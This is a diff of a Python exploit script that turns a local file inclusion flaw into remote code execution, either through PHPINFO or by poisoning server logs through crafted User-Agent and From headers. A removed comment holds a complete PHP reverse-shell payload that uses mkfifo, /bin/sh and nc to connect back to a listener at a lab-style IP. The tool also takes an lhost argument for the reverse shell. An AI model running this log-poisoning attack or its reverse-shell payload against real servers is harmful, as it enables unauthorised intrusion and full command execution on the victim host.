@@ -284,17 +284,13 @@ def controll_log(args):
     host=args.lfi.split("//")[1].split("/")[0]
     if ":" in host:
       host=host.split(":")[0]
-    # inject PAYLOAD into lof file
+    # inject PAYLOAD into log file
     debug('The payload: '+PAYLOAD,VERBOSE)
     PAYLOAD = PAYLOAD.replace("\r","").replace("\n","")
     debug('The payload: '+PAYLOAD,VERBOSE)
     HEADERS={"User-Agent":PAYLOAD, "From":PAYLOAD, "HTTP_USER_AGENT":PAYLOAD, 'Connection':'close'}
-    #ex="tt<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 9001 >/tmp/f') ?>"
-    #HEADERS={"User-Agent":ex}
     for i in range(3):
       http.request('GET', args.lfi, headers=HEADERS)
-      #requests.get(args.lfi, headers=HEADERS, proxies=proxies, verify=False, timeout=30)
-    # try to execute the payload from log files
     if args.logfile is not None:
       LOG_FILES.append(args.logfile)
     found=False
@@ -464,7 +460,6 @@ def main(args):
 
 if __name__=="__main__":
     arg_parser = argparse.ArgumentParser(description='RCE from LFI with PHPINFO assistance or Via controlled log file ')
-    #action, rem_args = arg_parser.parse_known_args()
     arg_parser.add_argument('-a','--action', dest='action', help='Define the attack type\n \t\t - 1 for PHPINFO and - 2 for controlled log. Value 1 by default')
     arg_parser.add_argument('-l','--lfi', dest='lfi', help='the url path of the LFI vuln, per example "http://127.0.0.1:8080/lfi.php?file=" ', type=str, required=True)
     arg_parser.add_argument('--lhost', dest='lhost', help='The local ip to listen, for rev shell', type=str, required=True)
